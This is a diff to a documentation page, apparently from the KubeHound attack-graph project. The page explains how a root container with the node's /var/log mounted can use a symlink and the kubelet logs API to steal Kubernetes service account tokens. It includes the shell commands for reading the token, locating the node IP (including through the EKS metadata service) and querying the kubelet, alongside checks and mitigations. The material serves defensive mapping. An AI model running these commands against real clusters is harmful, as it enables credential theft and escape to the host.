@@ -1,10 +1,21 @@
-# TOKEN_VAR_LOG_SYMLINK
+---
+title: TOKEN_VAR_LOG_SYMLINK
+---
 
-Steal all K8s API tokens from a node via an exposed `/var/log` mount.
+<!--
+id: TOKEN_VAR_LOG_SYMLINK
+name: "Steal service account token from volume"
+mitreAttackTechnique: T1552 - Unsecured Credentials
+mitreAttackTactic: TA0006 - Credential Access
+-->
+
+# TOKEN_VAR_LOG_SYMLINK
 
 | Source                                    | Destination                           | MITRE                            |
 | ----------------------------------------- | ------------------------------------- |----------------------------------|
-| [Container](../vertices/CONTAINER.md) | [Node](../vertices/NODE.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |
+| [Container](../entities/container.md) | [Node](../entities/node.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |
+
+Steal all K8s API tokens from a node via an exposed `/var/log` mount.
 
 ## Details
 
@@ -14,7 +25,7 @@ A pod running as root and with a mount point to the node’s `/var/log` director
 
 Execution as root within a container process with the host `/var/log/` (or any parent directory) mounted inside the container.
 
-See the [example pod spec](../../test/setup/test-cluster/attacks/TOKEN_VAR_LOG_SYMLINK.yaml).
+See the [example pod spec](https://github.com/DataDog/KubeHound/tree/main/test/setuptest-cluster/attacks/TOKEN_VAR_LOG_SYMLINK.yaml).
 
 ## Checks
 
@@ -56,9 +67,12 @@ ln -s / /host/var/log/root_link
 
 Call the kubelet API to read the “logs” and extract pod service account tokens:
 
+TODO Christophe: I was unable to call the kubelet on EKS
+
 ```bash
 $ KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 $ NODEIP=$(ip route | awk '/^default/{print $3}')
+# On Amazon EKS, if you have access to the IMDS: NODEIP=$(curl http://169.254.169.254/latest/meta-data/local-ipv4)
 
 # Find all the pods
 $ curl -sk -H "Authorization: Bearer $KUBE_TOKEN" https://$NODEIP:10250/logs/root_link/var/lib/kubelet/pods/
@@ -103,7 +117,7 @@ Avoid running containers as the root user. Specify an unprivileged user account 
 
 ## Calculation
 
-+ [TokenVarLogSymlink](../../pkg/kubehound/graph/edge/token_var_log_symlink.go)
++ [TokenVarLogSymlink](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/token_var_log_symlink.go)
 
 ## References:
 
